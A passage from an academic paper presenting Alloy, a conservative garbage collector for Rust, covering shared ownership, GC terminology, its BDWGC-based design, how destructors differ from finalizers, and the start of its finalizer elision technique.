than previous solutions but introduces surprising soundness and
performance problems. <span>Alloy</span> provides
novel solutions for the core problems: <em>finalizer safety
analysis</em> rejects unsound destructors from automatically being
reused as finalizers; <em>finalizer elision</em> optimises away
unnecessary finalizers; and <em>premature finalizer prevention</em>
ensures that finalizers are only run when it is provably safe to do
so.</p>
    <h3><span>1    </span> <a id="x1-10001"></a>Introduction</h3>

<p>
Amongst the ways one can classify programming languages are whether they are Garbage Collected
(GCed) or not: GCed languages enable implicit memory management; non-GCed languages require
explicit memory management (e.g <code>C</code>'s <code>malloc</code> / <code>free</code> functions). Rust's use of affine types [<a href="#Xpierce04advanced">25</a>, p. 5] and
ownership does not fit within this classification: it is not GCed but it has implicit scope-based
memory management. Most portions of Rust programs are as succinct as a GCed equivalent, but
ownership is too inflexible to express <em>shared ownership</em> for data-structures that require multiple
owners (e.g. doubly linked lists). Workarounds such as reference counting impose an extra
burden on the programmer, make mistakes more likely, and often come with a performance
penalty.
</p>
<p>
In an attempt to avoid such problems, there are now a number of GCs for Rust (e.g. [<a href="#Xshifgrethor">2</a>, <a href="#Xcoblenz21bronze">11</a>, <a href="#Xmanish15rustgc">14</a>, <a href="#Xgcarena">32</a>, <a href="#Xboa">33</a>]).
Most introduce a user-visible type <code>Gc&lt;T&gt;</code> which takes a value <em>v</em> of type <code>T</code> and moves <em>v</em> to the 'GC
heap'. The <code>Gc&lt;T&gt;</code> value itself is a wrapper around a pointer to <em>v</em> on the GC heap. <code>Gc&lt;T&gt;</code> can be
<em>cloned</em> (i.e. duplicated) and <em>dereferenced</em> to a value of type <code>&amp;T</code> (i.e. a type-safe pointer) at
will by the user. When no <code>Gc&lt;T&gt;</code> wrappers pointing to <em>v</em> can be found, indirectly or directly,
from the program's <em>roots</em> (e.g. variables on the stack), then the GC heap memory for <em>v</em> can be
reclaimed.
</p>
<p>
It has proven hard to find a satisfying design and implementation for a GC for Rust, as perhaps
suggested by the number of attempts to do so. We identify two fundamental challenges for
GC for Rust: how to give <code>Gc&lt;T&gt;</code> an idiomatic and complete API; and how to make <em>finalizers</em>
(i.e. the code that is run just before a value is collected by the GC) safe, performant, and
ergonomic.
</p>
<figure>
<a id="x1-1001r1"></a>
    <pre><code>struct GcNode { value: u8, nbr: Option&lt;Gc&lt;RefCell&lt;GcNode&gt;&gt;&gt;}
impl Drop for GcNode { fn drop(&amp;mut self) { println!("drop {}", self.value); } }

fn main() {
  let mut gc1 = Gc::new(RefCell::new(GcNode { value: 1, nbr: None } ));
  gc1.borrow_mut().nbr = Some(gc1);
  let gc2 = Gc::new(RefCell::new(GcNode { value: 2, nbr: None } ));
  gc2.borrow_mut().nbr = Some(gc2);
  gc1 = gc2;
  force_gc();
  println!("{} {}", gc1.borrow().value, gc1.borrow().nbr.unwrap().borrow().value);
}</code></pre>
<figcaption>
    <span>Listing 1.</span> An <em>Alloy</em> example, showing <code>Gc&lt;T&gt;</code>
and destructors as finalizers. We create a type <code>GcNode</code> which
models a graph: it stores an 8 bit integer value and a possibly-null
reference (via Rust's standard <code>Option</code> type) to a neighbouring node
(<span data-line="1">line 1</span>). We add a normal Rust destructor which <span>Alloy</span> is able to use as a
finalizer when <code>GcNode</code> is used inside <code>Gc&lt;T&gt;</code> (<span data-line="2">line 2</span>).
Inside <code>main</code> we create the first GCed node in the graph (<span data-line="5">line 5</span>).
We use Rust's normal <code>RefCell</code> type to allow the node to be mutated
(using the <code>RefCell::borrow_mut</code> method which dynamically checks
for mutation that would undermine Rust's static rules)
and a cycle created directly back to itself (<span data-line="6">line 6</span>). We then create a second cyclic graph (<span data-line="7">lines 7</span>
and <span data-line="8">8</span>), immediately assigning it to the <code>gc1</code> variable (<span data-line="9">line 9</span>):
this copies, rather than moves, the <code>Gc&lt;T&gt;</code>.
This causes the first cyclic graph <code>GcNode{value: 1, ..}</code>
to no longer be reachable, so after forcing a collection (<span data-line="10">line 10</span>) that node
can be collected. Its finalizer is then scheduled to be run, causing
<code>drop 1</code> to be printed out at a later point; when it has completed the GC
heap memory can be reclaimed. The print statement outputs <code>2 2</code> (<span data-line="11">line
11</span>).
</figcaption>
</figure>
<p>
In this paper we introduce <span>Alloy</span>, a new GC for Rust: an example of its use is shown in Listing <a href="#x1-1001r1">1</a>.
<span>Alloy</span> uses <em>conservative</em> garbage collection (i.e. treating each reachable machine word as a potential
pointer), which naturally solves the API challenge. However, the finalization challenge is much
more involved: the causes of this challenge, and our solutions to it, occupy the bulk of this
paper.
</p>
<p>
Normal Rust code uses <em>destructors</em> (i.e. code which is run just before a value is reclaimed by Rust's
implicit memory management) extensively. Although finalizers and destructors may seem to be
synonyms, existing GCs for Rust cannot reuse destructors as finalizers: the latter must be manually
implemented for each type that needs it. Unfortunately, even this is trickier than it appears: it is not
possible to implement a finalizer for <code>Gc&lt;T&gt;</code> if <code>T</code> is an external library; some parts of destructors are
automatically created by the Rust compiler, but hand-written finalizers must duplicate those parts
manually; and users can accidentally cause a type's finalizer to be run more than once. In short,
finalization in existing GCs for Rust is unpalatable.
</p>
<p>
GCs for Rust are not alone in requiring manually written finalizers. In a close cousin to our work, a
GC proposal for C++, the reuse of destructors as finalizers was ruled out due to seemingly
insoluble problems [<a href="#Xboehm09garbage">8</a>, p. 32], which we divide into four categories: (1) some safe destructors are
not safe finalizers; (2) finalizers can be run prematurely; (3) running finalizers on the same
thread as a paused mutator can cause race conditions and deadlocks; (4) and finalizers are
prohibitively slower than destructors. All are, at least to some degree, classical GC problems; all are
exacerbated in some way by Rust; and none, with the partial exception of #2, has existing
solutions.
</p>
<p>
We show that it is possible to reuse most Rust destructors as finalizers in a satisfying way. We
introduce novel solutions to the long-standing problems this implies by making use of some of Rust's
unusual static guarantees. We thus gain a better GC for Rust <em>and</em> solutions to open GC problems. Our
solutions, in order, are: (1) <em>finalizer safety analysis</em> extends Rust's static analyses to reject
programs whose destructors are not provably safe to be used as finalizers; (2) <em>premature finalizer
prevention</em> automatically inserts fences to prevent the GC from being 'tricked' into collecting
values before they are dead; (3) we run finalizers on a separate thread; and (4) and <em>finalizer
elision</em> statically optimises away finalizers if the underlying destructor duplicates the GC's
work.
</p>
<p>
<span>Alloy</span> as an implementation is necessarily tied to Rust, though most of the novel techniques in this
paper rely on general properties of affine types and ownership. While we do not wish to claim generality
without evidence, it seems likely that many of the techniques in this paper will generalise to other
ownership-based languages, as and when such emerge.
</p>
<p>
Although <span>Alloy</span> is not production ready, its performance is already reasonable: when we control for
the (admittedly somewhat slow) conservative GC (<span>BDWGC</span>) <span>Alloy</span> currently uses, the performance of
<span>Alloy</span> varies from 0.74× to, in the worst case, 1.17× that of reference counting. <span>Alloy</span> is also sufficiently
polished (e.g. good quality error messages) in other ways for it to: show a plausible path forwards for
those who may wish to follow it; and to allow others to evaluate whether GC for Rust is a good idea or
not.
</p>
<p>
This paper is divided into four main parts: GC and Rust background (Section <a href="#x1-20002">2</a>); <span>Alloy</span>'s basic
design (Section <a href="#x1-50003">3</a>); destructor and finalizer challenges and solutions (Sections 4 to 7); and
evaluation (Section <a href="#x1-210008">8</a>). The first three parts have the challenge that our work straddles two
areas that can seem mutually exclusive: GC and Rust. We have tried to provide sufficient
material for readers expert in one of these areas to gain adequate familiarity with the other,
without boring either, but we encourage readers to skip material they are already comfortable
with.
</p>

    <h3><span>2    </span> <a id="x1-20002"></a>Background</h3>

<p><span><span><span>2.1    </span></span> <a id="x1-30002.1"></a><span>The Challenges of Shared Ownership in Rust</span></span>
</p>

<p>
Rust uses affine types and <em>ownership</em> to statically guarantee that: a value has a single owner (e.g. a
variable); an owner can <em>move</em> (i.e. permanently transfer the ownership of) a value to another owner;
and when a value's owner goes out of scope, the value's destructor is run and its backing
memory reclaimed. An owner can pass <em>references</em> to a value to other code, subject to the
following static restrictions: there can be multiple immutable references ('<code>&amp;</code>') to a value or a single
mutable reference ('<code>&amp;mut</code>'); and references cannot outlast the owner. These rules allow many
Rust programs to be as succinct as their equivalents in GCed languages. This suggests that
the search for a good GC for Rust may be intellectually stimulating but of little practical
value.
</p>

<p>
However, there are many programs which need to express data structures which do not fit into the
restrictions of affine types and ownership. These are often described as 'cyclic data-structures', but in this
paper we use the more abstract term 'shared ownership', which includes, but is not limited to, cyclic
data-structures.
</p>

<p>
A common way of expressing shared ownership is to use the reference counting type <code>Rc&lt;T&gt;</code> from
Rust's standard library. For many data-structures, this is a reasonable solution, but some forms of shared
ownership require juggling strong and weak counts. This complicates programs (see Listing <a href="#x1-3001r2">2</a>) and can
cause problems when values live for shorter or longer than intended.
</p>

<figure>
<a id="x1-3001r2"></a>
<pre><code>struct RcNode { value: u8, nbr: Option&lt;Weak&lt;RefCell&lt;RcNode&gt;&gt;&gt; }
impl Drop for RcNode { fn drop(&amp;mut self) { println!("drop {}", self.value); } }

fn main() {
  let mut rc1 = Rc::new(RefCell::new(RcNode{value: 1, nbr: None}));
  rc1.borrow_mut().nbr = Some(Rc::downgrade(&amp;rc1));
  let rc2 = Rc::new(RefCell::new(RcNode{value: 2, nbr: None}));
  rc2.borrow_mut().nbr = Some(Rc::downgrade(&amp;rc2));
  rc1 = Rc::clone(&amp;rc2);
  println!("{} {}", rc1.borrow().value,
                   rc1.borrow().nbr.as_ref().unwrap().upgrade().unwrap().borrow().value);
}</code></pre>

<figcaption>
    <span>Listing 2. </span>
    <span>A version of Listing <a href="#x1-1001r1">1</a> using Rust's standard reference counting type <code>Rc&lt;T&gt;</code>. To avoid
memory leaks we use <em>weak</em> references between nodes (<span data-line="1">line 1</span>). We again create two cyclic
graphs (<span data-line="5">lines 5</span>–<span data-line="8">8</span>) using <code>Rc::downgrade</code> to create weak references (<span data-line="6">lines 6</span> and <span data-line="8">8</span>). Since <code>Rc&lt;T&gt;</code> is
not copyable, we must use a manual <code>clone</code> call to have both the <code>rc1</code> and <code>rc2</code> variables point to
the same cyclic graph (<span data-line="9">line 9</span>). Accessing a neighbour node becomes a delicate dance requiring
upgrading the weak reference (<span data-line="11">line 11</span>). The need to downgrade <code>Rc&lt;T&gt;</code> to <code>Weak&lt;T&gt;</code> and upgrade
(which may fail, hence the <code>unwrap</code>) back to <code>Rc&lt;T&gt;</code> creates significant extra complexity relative
to Listing <a href="#x1-1001r1">1</a>: compare line 11 in Listing <a href="#x1-1001r1">1</a> to <span data-line="10">lines 10</span>-<span data-line="11">11</span> above.</span>
</figcaption>

</figure>

<p>
A different solution is to store values in a vector and use integer indices into that vector. Such indices
are morally closer to machine pointers than normal Rust references: the indices can become stale,
dangle, or may never have been valid in the first place. The programmer must also manually
deal with issues such as detecting unused values, compaction, and so on. In other words,
the programmer ends up writing a partial GC themselves. A variant of this idea are <em>arenas</em>,
which gradually accumulate multiple values but free all of them in one go: values can no
longer be reclaimed too early, though arenas tend to unnecessarily increase the lifetime of
values.
</p>

<p>
A type-based approach is <code>GhostCell</code> [<a href="#Xyanovski21ghostcell">35</a>], which uses <em>branding</em> to statically ensure that at any given
point only one part of a program can access a shared ownership data-structure. This necessarily excludes
common use cases where multiple owners (e.g. in different threads) need to simultaneously access
disjoint parts of a data-structure.
</p>

<p>
Although it is easily overlooked, some workarounds (e.g. <code>Rc&lt;T&gt;</code>) rely on using <em>unsafe</em> Rust
(i.e. parts of the language, often involving pointers, that are not fully statically checked by the
compiler). Pragmatically, we assume that widely used code, even if technically unsafe, has
been pored over sufficiently that it is trustworthy in practise. However, 'new' solutions that a
programmer implements using unsafe Rust are unlikely to immediately reach the same level of
trustworthiness.
</p>

<p>
While we do not believe that every Rust program would be improved by GC, the variety of
workarounds already present in Rust code, and the difficultly of creating new ones, suggests that there is
a subset that would benefit from GC.
</p>

    <p><span><span>2.2    </span> <a id="x1-40002.2"></a>GC Terminology</span></p><p>
GC is a venerable field and has accumulated terminology that can seem unfamiliar or unintuitive. We mostly
use the same terminology as Jones et al [<a href="#Xjones23garbage">19</a>],
the major parts of which we define here.
</p>

<p>
A program which uses GC is split between the <em>mutator</em> (the user's program) and the <em>collector</em> (the GC
itself). At any given point in time, a thread is either running as a mutator or a collector. In our context, all
threads run as a collector at least sometimes (for reasons that will become apparent later, some threads
always run as a collector). Tracing and reclamation is performed during a <em>collection</em> phase. Our
collections always <em>stop-the-world</em>, where all threads running mutator code are paused while collection
occurs.
</p>

<p>
A <em>tracing</em> GC is one that scans memory looking for reachable values from a program's roots: values,
including cycles of values, that are not reachable from the roots can then be <em>reclaimed</em>. In contrast, a pure
reference counting GC does not scan memory, and thus cannot free values that form a cycle. Increasingly,
GC implementations make use of multiple techniques (see [<a href="#Xbacon04unified">3</a>]) but, for simplicity's sake, we assume that
implementations wholly use one technique or another except otherwise stated. For brevity, we use 'GC'
as a short-hand for 'tracing GC'; when we deal with other kinds of GC (e.g. reference counting), we
explicitly name them.
</p>

<p>
We refer to memory which is allocated via <code>Gc&lt;T&gt;</code> as being on the <em>GC heap</em>. We use the term 'GC value'
to refer both to the pointer wrapped in a <code>Gc&lt;T&gt;</code> and the underlying value on the GC heap, even though
multiple pointers / wrappers can refer to a single value on the GC heap, unless doing so would lead to
ambiguity.
</p>

<p>
We use '<span>Alloy</span>' to refer to the combination of: our extension to the Rust language; our modifications to
the <code>rustc</code> compiler; and our integration of the Boehm-Demers-Weiser GC (<span>BDWGC</span>) into the runtime of
programs compiled with our modified <code>rustc</code>.
</p>

    <h3><span>3    </span> <a id="x1-50003"></a><span>Alloy</span>: Design and Implementation</h3>

<p>In this section we outline <span>Alloy</span>'s basic design and implementation choices – the rest of the paper then
goes into detail on the more advanced aspects.
</p>

<p><span>3.1    </span> <a id="x1-60003.1"></a>Basic Design</p>

<p><span>Alloy</span> provides a <code>Gc&lt;T&gt;</code> type that exposes an API modelled on the <code>Rc&lt;T&gt;</code> type from Rust's
standard library, because <code>Rc&lt;T&gt;</code>: is conceptually similar to <code>Gc&lt;T&gt;</code>; widely used in Rust code, and
its API familiar; and that API reflects long-term experience about what Rust programmers
need.
</p>

<p>
When a user calls <code>Gc::new(v)</code>, the value <code>v</code> is moved to the GC heap: the <code>Gc&lt;T&gt;</code> value returned
to the user is a simple wrapper around a pointer to <code>v</code>'s new address. The same underlying
GCed value may thus have multiple, partly or wholly overlapping, references active at any
point. To avoid undermining Rust's ownership system, dereferencing a <code>Gc&lt;T&gt;</code> produces an
immutable (i.e. '<code>&amp;</code>') reference to the underlying value. If the user wishes to mutate the underlying
value, they must use other Rust types that enable <em>interior mutability</em> (e.g. <code>RefCell&lt;T&gt;</code> or
<code>Mutex&lt;T&gt;</code>).
</p>

<p>
One feature that <span>Alloy</span> explicitly supports is the ability in Rust to cast references to raw pointers and
back again. This can occur in two main ways. <code>Gc&lt;T&gt;</code> can be dereferenced to <code>&amp;T</code> which can
then, as with any other reference, be converted to *const T (i.e. a C-esque pointer to T).
<code>Gc&lt;T&gt;</code> also supports the common Rust functions (<code>into_raw</code> and <code>from_raw</code>) which wrap the
value-to-pointer conversion in a slightly higher-level API. The ability to convert references to raw
pointers is used in many places (e.g. Rust's standard C Foreign Function Interface (FFI)).
We believe that a viable GC for Rust must allow the same conversions, but doing so has a
profound impact because Rust allows raw pointers to be converted to the integer type <code>usize</code> and
back<span><a href="#fn1x0"><sup>1</sup></a></span><a id="x1-6001f1"></a>.
</p>

<p>
Having acknowledged that pointers can be 'disguised' as integers, it is then inevitable that <span>Alloy</span> must
be a conservative GC: if a machine word's integer value, when considered as a pointer, falls within a
GCed block of memory, then that block itself is considered reachable (and is transitively scanned). Since a
conservative GC cannot know if a word is really a pointer, or is a random sequence of bits that happens
to be the same as a valid pointer, this over-approximates the <em>live set</em> (i.e. the blocks that the GC will not
reclaim). Typically the false detection rate is very low (see e.g. a Java study which measures it at under
0.01% of the live set [<a href="#Xshahriyar14fast">28</a>]).
</p>

<p>
Conservative GC occupies a grey zone in programming language semantics: in most languages, and
most compiler's internal semantics, conservative GC is, formally speaking, unsound; and
furthermore some languages (including Rust) allow arbitrary 'bit fiddling' on pointers, temporarily
obscuring the address they are referring to. Despite this, conservative GC is widely used,
including in the two most widespread web browsers: Chrome uses it in its Blink rendering
engine [<a href="#Xager13oilpan">1</a>] and Safari uses it in its JavaScript VM JavaScriptCore [<a href="#Xpizlo17riptide">26</a>]. Even in 2025,
we lack good alternatives to conservative GC: there is no cross-platform API for precise GC; and while
some compilers such as LLVM provide some support for GC features [<a href="#Xllvm14statepoints">23</a>], we have found them
incomplete and buggy. Despite the potential soundness worries, conservative GC thus remains a widely
used technique.
</p>

<p>
Conservative GC enables <span>Alloy</span> to make a useful ergonomic improvement over most other GCs
for Rust whose <code>Gc&lt;T&gt;</code> is only <em>cloneable</em>. Such types can be duplicated, but doing so requires
executing arbitrary user code. To make the possible run-time cost of this clear, Rust has no
direct syntax for cloning: users must explicitly call <code>Rc::clone(&amp;v)</code> to duplicate a value <code>v</code>. In
contrast, since <span>Alloy</span>'s <code>Gc&lt;T&gt;</code> is just a wrapper around a pointer it is not just cloneable but
also <em>copyable</em>: duplication only requires copying bytes (i.e. no arbitrary user code need be
executed). Copying is implied by assignment (i.e. <code>w = v</code>), reducing the need for explicit
cloning<span><a href="#fn2x0"><sup>2</sup></a></span><a id="x1-6003f2"></a>.
This is not just a syntactic convenience but also reflects an underlying semantic difference: duplicating a
<code>Gc&lt;T&gt;</code> in <span>Alloy</span> is is a cheaper and simpler operation than most other GCs for Rust which which tend to
rely, at least in part, on reference counting.
</p>

<p>
There is one notable limitation of <code>Gc&lt;T&gt;</code>'s API relative to <code>Rc&lt;T&gt;</code>. The latter, by definition, knows how
many references there are to the underlying data, allowing the value stored inside it to be mutably
borrowed at run-time if there is only a single reference to it (via <code>get_mut</code> and <code>make_mut</code>). In contrast,
<code>Gc&lt;T&gt;</code> cannot know how many references there are to the underlying data. As we shall see in Section <a href="#x1-210008">8</a>,
some Rust programs are built around the performance advantages of this API (e.g. turning 'copy on
write' into just 'write' in some important cases).
</p>

<p><span>3.2    </span> <a id="x1-70003.2"></a>Basic Implementation</p>

<p>The most visible aspect of <span>Alloy</span> is its fork, and extension of, the standard Rust compiler <code>rustc</code>. We
forked <code>rustc</code> 1.79.0, adding or changing approximately 5,500 Lines of Code (LoC) in the core compiler,
and adding approximately 2,250 LoC of tests.
</p>

<p>
<span>Alloy</span> uses <span>BDWGC</span> [<a href="#Xboehm88garbage">9</a>] as the underlying conservative GC, because it is the most widely ported
conservative GC we know of. We use <span>BDWGC</span>'s <code>GC_set_finalize_on_demand(1)</code> API, which causes
finalizers to be run on their own thread.
</p>

<p>
We had to make some minor changes to <span>BDWGC</span> to suit our situation. First, we disabled <span>BDWGC</span>'s
parallel collector because it worsens <span>Alloy</span>'s performance. It is unclear to us why this happens:
we observe significant lock contention within <span>BDWGC</span> during GC collections, but have not
correlated this with a cause. Second, <span>BDWGC</span> cannot scan pointers stored in thread locals
because these are platform dependent. Fortunately, <code>rustc</code> uses LLVM's thread local storage
implementation, which stores such pointers in the <code>PT_TLS</code> segment of the ELF binary: we modified
<span>BDWGC</span> to scan this ELF segment during each collection. Third, <span>BDWGC</span> dynamically intercepts
thread creation calls so that it can can scan their stacks, but (for bootstrapping reasons) is
unable to do so in our context: we explicitly changed <span>Alloy</span> to register new threads with
<span>BDWGC</span>.
</p>

    <h3><span>4    </span> <a id="x1-80004"></a>Destructors and Finalizers</h3>

<p>In many GCed languages, 'destructor' and 'finalizer' are used as synonyms, as both terms refer to code
run when a value's lifetime has ended. In existing GCs for Rust, these two terms refer to completely
different hierarchies of code (i.e. destructors and finalizers are fundamentally different). In <span>Alloy</span>, in
contrast, a reasonable first approximation is that finalizers are a strict subset of destructors. In this
section we pick apart these differences, before describing the challenges of using destructors as
finalizers.
</p>

<p>
When a value in Rust is <em>dropped</em> (i.e. at the point its owner goes out of lexical scope) its destructor is
automatically run. Rust's destructors enable a style of programming that originated in C++ called RAII
(Resource Acquisition Is Initialization) [<a href="#Xstroustrup97c++">30</a>, Section 14.4]: when a value is dropped, the underlying
resources it possesses (e.g. file handles or heap memory) are released. Destructors are used frequently in
Rust code (to give a rough idea: approximately 15% of source-level types in our benchmark suite have
destructors).
</p>

<p>
Rust destructors are formed of two parts, run in the following order: a user-defined <em>drop method</em>; and
automatically inserted <em>drop glue</em>. Drop methods are optional and users can provide one for a type by
implementing the <code>Drop</code> trait's <code>drop</code> method. Drop glue recursively calls destructors of contained types
(e.g. fields in a struct). Although it is common usage to conflate 'destructor' in Rust with drop methods,
drop glue is an integral part of a Rust destructor: we therefore use 'destructor' as the umbrella term for
both drop methods and drop glue.
</p>

<p>
When considering finalizers for a GC for Rust, there are several layers of design choices. We will
shortly see that finalizers cause a number of challenges (Section <a href="#x1-90004.1">4.1</a>) and one choice would be to forbid
finalizers entirely. However, this would mean that one could not sensibly embed types that have
destructors in a <code>Gc&lt;T&gt;</code>. While Rust does not always call destructors, the situations where this occurs are
best considered 'exceptional': not calling destructors from <code>Gc&lt;T&gt;</code> would completely undermine
reasonable programmer expectations. Because of this, <span>Alloy</span>, and indeed virtually all GCs for Rust,
support finalizers in some form.
</p>

<p>
However, existing GCs force distinct notions of destructors and finalizers onto the programmer. Where
the former have the <code>Drop</code> trait, the latter typically have a <code>Finalize</code> trait. If a user type needs to be
finalized then the user must provide an implementation of the <code>Finalize</code> trait. However, doing so
introduces a number of problems: (1) external libraries are unlikely to provide finalizers, so they must be
manually implemented by each consumer; (2) Rust's <em>orphan rule</em> [<a href="#Xrustlangref">27</a>, Section 6.12] prevents one
implementing traits for types defined in external libraries (i.e. unless a library's types were designed to
support <code>Gc&lt;T&gt;</code>, those types cannot be directly GCed); (3) one cannot automatically replicate drop glue
for finalizers; and (4) one cannot replicate <code>rustc</code>'s refusal to allow calls to the equivalent of
<code>Drop::drop</code>.
</p>

<p>
Programmers can work around problems #1 and #2 in various ways. For example, they can wrap
external library types in <em>newtypes</em> (zero-cost wrappers) and implement finalizers on those instead [<a href="#Xklabnik18rust">20</a>,
Section 19.3]. Doing so is tedious but not conceptually difficult.
</p>

<p>
Problem #3 has partial solutions: for example, [<a href="#Xmanish15rustgc">14</a>] uses the <code>Trace</code> macro to generate <em>finalizer glue</em> (the
finalizer equivalent of drop glue) for struct fields. This runs into an unsolvable variant of problem #2:
types in external libraries will not implement this trait and cannot be recursively scanned for finalizer
glue.
</p>

<p>
Problem #4 is impossible to solve in Rust as-is. One cannot define a function that can never be called —
what use would such a function have? A possible partial solution might seem to be for the <code>finalize</code>
method take ownership of the value, but <code>Drop::drop</code> does not do so because that would not allow drop
glue to be run afterwards.
</p>

<p><span>4.1    </span> <a id="x1-90004.1"></a>General Challenges When Using Destructors as Finalizers</p>

<p>We have stated as our aim that <span>Alloy</span> should use destructors as finalizers. Above we explained some
Rust-specific challenges — but there are several non-Rust-specific challenges too! Fundamentally, finalizers
and destructors have different, and sometimes incompatible, properties. The best guide to these differences,
and the resulting problems, is Boehm [<a href="#Xboehm03destructors">6</a>], supplemented by later work on support for GC in the C++
specification [<a href="#Xboehm09garbage">8</a>]<span><a href="#fn3x0"><sup>3</sup></a></span><a id="x1-9001f3"></a>.
</p>

<p>
An obvious difference between destructors and finalizers is when both are run. While C++ and Rust define precisely when a destructor will be
run<span><a href="#fn4x0"><sup>4</sup></a></span><a id="x1-9003f4"></a>,
finalizers run at an unspecified point in time. This typically happens at some point after the
equivalent destructor would run, though a program may exit before any given finalizer is
run<span><a href="#fn5x0"><sup>5</sup></a></span><a id="x1-9005f5"></a>.
There are, however, two situations which invert this. First, if a thread exits due to an error, and the
program is either not compiled with unwinding, or the thread has crossed a non-unwinding ABI
boundary, then destructors might not be run at all, where a GC will naturally run the equivalent
finalizers: we do not dwell on this, as both behaviours are reasonable in their different contexts. Second,
and more surprisingly, it is possible for finalizers in non-error situations to run <em>prematurely</em>, that is before
the equivalent destructor [<a href="#Xboehm03destructors">6</a>, section 3.4].
</p>

<p>
A less obvious difference relates to where destructors and finalizers are run. Destructors run in the
same thread as the last owner of a value. However, running finalizers in the same thread as the last owner
of the value can lead to race conditions [<a href="#Xniko13destructors">24</a>] and deadlocks [<a href="#Xboehm03destructors">6</a>, section 3.3] if a finalizer tries to
access a resource that the mutator expects to have exclusive access too. When such problems
affect destructors in normal Rust code, it is the clear result of programmer error, since they
should have taken into account the predictable execution point of destructors. However, since
finalizers do not have a predictable execution point, there is no way to safely access shared
resources if they are run on the same thread. The only way to avoid this is to run finalizers
on a non-mutator thread — but not all Rust types / destructors are safe to run on another
thread.
</p>

<p>
There are several additional differences such as: finalizers can reference other GCed values
that are partly, or wholly, 'finalized' and may have had their backing memory reused; and
finalizers can <em>resurrect</em> values by copying the reference passed to the finalizer and storing it
somewhere.
</p>

<p>
Over time, finalizers have thus come to be viewed with increasing suspicion. Java, for example, has
deprecated, and intends eventually removing, per-type finalizers: instead it has introduced deliberately
less flexible per-object 'cleaners', whose API prevents problems such as object resurrection and per-class
finalization [<a href="#Xgoetz21deprecated">13</a>].
</p>

<p><span>4.2    </span> <a id="x1-100004.2"></a>The Challenge of Finalizers for <span>Alloy</span></p>

<p>At this point we hope to have convinced the reader that: a viable GC for Rust needs to be able to use
existing destructors as finalizers whenever possible; but that finalizers, even in existing GCs, cause
various problems.
</p>

<p>
It is our belief that some problems with finalizers are fundamental. For example, finalizers inevitably
introduce latency between the last use of a value and its finalization.
</p>

<p>
Some problems with finalizers are best considered the accidental artefacts of older designs.
Java's cleaners, for example, can be thought of as a more restrictive version of finalizers that
allow most common use-cases but forbid by design many dangerous use cases. For example,
per-class/struct finalization can easily be replaced by per-object/value finalization; and object
resurrection can be prevented if object access requires a level of indirection. <span>Alloy</span> benefits from
our better shared understanding of such problems and the potential solutions: it trivially
addresses per-object/value finalization (<code>Gc::new_unfinalizable</code> function turns finalization off
for specific values) and, as we shall see later, via only slightly more involved means, object
resurrection.
</p>

<p>
However, that leaves many problems that are potentially in the middle: they are not obviously
fundamental, but there are not obvious fixes for them either. In our context, where we wish to use
destructors as finalizers, four problems have hitherto been thought insoluble [<a href="#Xboehm09garbage">8</a>, p. 32]: (1) finalizers are
prohibitively slower than destructors; (2) finalizers can run prematurely; (3) running finalizers on the
same thread as a paused mutator can cause race conditions and deadlocks; (4) some safe destructors are
not safe finalizers.
</p>

<p>
Fortunately for us, Rust's unusual static guarantees, suitably expanded by <span>Alloy</span>, allow us to
address each problem in novel, satisfying, ways. In the following section, we tackle these
problems in the order above, noting that we tackle problems #1 and #2 separately, and #3 and #4
together.
</p>

<h3><span>5    </span> <a id="x1-110005"></a>Finalizer Elision</h3>

<p>As we shall see in Section <a href="#x1-210008">8</a>, there is a correlation between the number of finalizers that are run and
overhead from GC (with a worst case, albeit a definite outlier, in our experiment of 3.35× slowdown). In
this section we show how to reduce the number of finalizers that are run, which helps reduce this
overhead.
</p>

<p>
A variety of factors contribute to the finalizer performance overhead, including: a queue of finalizers
must be maintained, whereas destructors can be run immediately; finalizers run some time after the last
access of a value, making cache misses more likely; and finalizers can cause values (including values they
own) to live for longer (e.g. leading to increased memory usage and marking overhead). Most of these
factors are inherent to any GC and our experience of using and working on <span>BDWGC</span>– a mature, widely
used GC – does not suggest that it is missing optimisations which would overcome all of this
overhead.
</p>

<p>
Instead, whenever possible, <span>Alloy</span> <em>elides</em> finalizers so that they do not need to be run at all. We are able
to do this because: (1) <span>BDWGC</span> is responsible for all allocations and will, if necessary GC allocations even
if they are not directly wrapped in a <code>Gc&lt;T&gt;</code>; and (2) many Rust destructors only free memory which
<span>BDWGC</span> would, albeit with some latency, do anyway.
</p>

<p>
Consider the standard Rust type <code>Box&lt;T&gt;</code> which heap allocates space for a value; when a <code>Box&lt;T&gt;</code> value
is dropped, the heap allocation will be freed. We can then make two observations. First, <code>Box&lt;T&gt;</code>'s drop
method solely consists of a <code>deallocate</code> call. Second, while we informally say that <code>Box&lt;T&gt;</code> allocates on
the 'heap' and <code>Gc&lt;T&gt;</code> allocates on the 'GC heap', all allocations in <span>Alloy</span> are made through <span>BDWGC</span> and
stored in the same heap.
</p>

<p>
When used as a finalizer, <code>Box&lt;T&gt;</code>'s drop method is thus unneeded, as the underlying memory will be
freed by <span>BDWGC</span> anyway. This means that there is no need to run a finalizer for a type such as
<code>Gc&lt;Box&lt;u8&gt;&gt;</code> at all, and the finalizer can be statically elided. However, we cannot elide a
finalizer for a type such as <code>Gc&lt;Box&lt;Rc&lt;u8&gt;&gt;&gt;</code> because <code>Rc&lt;T&gt;</code>'s drop method must be run for the
reference count to be decremented. As this shows, we must consider the complete destructor, and
not just the top-level drop method, when deciding whether a corresponding finalizer can be
elided.
</p>

<figure>
<a id="x1-11002r1"></a>
<pre><code>function NeedsFinalizer(T):
    if Impls(T, Drop) and not Impls(T, DropMethodFinalizerElidable) then
        return true;
    for each field ∈ T do
        if NeedsFinalizer(field) then
            return true;
    return false;</code></pre>
<figcaption><span>Algorithm 1. </span><span>Finalizer Elision</span></figcaption>
</figure>

<figure>
<a id="x1-11019r3"></a>
<pre><code>impl&lt;T&gt; Gc&lt;T&gt; {
  pub fn new(value: T) -&gt; Self {
    if needs_finalizer::&lt;T&gt;() { Gc&lt;T&gt;::new_with_finalizer(value) }
    else { Gc&lt;T&gt;::new_without_finalizer(value) }
    ...
  }
}</code></pre>
<figcaption><span>Listing 3.  </span><span>A  simplified  view  of  how  finalizers  are  elided  inside  <span>Alloy</span>.  The  new  compiler
intrinsic <code>needs_finalizer</code> returns true if a finalizer is required for a type. The <code>Gc&lt;T&gt;</code> type uses this
intrinsic to ensure that the value is registered as requiring a finalizer. With optimisations turned
on, this seemingly dynamic, branching code will be turned into static, branchless code.</span></figcaption>
</figure>

<p><span>5.1    </span> <a id="x1-120005.1"></a>Implementing Finalizer Elision</p>

<p>Finalizer elision statically determines which type's destructors do not require corresponding finalizers
and elides them. It does so conservatively, and deals correctly with drop glue.
